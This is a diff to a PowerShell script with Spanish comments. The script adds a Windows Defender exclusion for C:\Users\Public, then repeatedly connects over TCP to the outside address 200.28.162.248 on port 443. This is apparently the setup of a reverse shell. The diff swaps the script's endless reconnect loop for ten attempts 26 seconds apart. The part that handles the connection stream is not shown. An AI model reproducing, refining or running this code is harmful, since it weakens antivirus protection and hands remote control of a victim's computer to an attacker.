@@ -1,7 +1,9 @@
 # Excluir la ruta completa
 Add-MpPreference -ExclusionPath "C:\Users\Public"
 
-while ($true) {
+$maxIterations = 10
+
+for ($count = 1; $count -le $maxIterations; $count++) {
     try {
         $client = New-Object System.Net.Sockets.TCPClient("200.28.162.248",443)
         $stream = $client.GetStream()
@@ -23,5 +25,6 @@ while ($true) {
         # opcional: escribir el error si quieres debug
         # Write-Host "Error: $_"
     }
+
     Start-Sleep -Seconds 26
 }
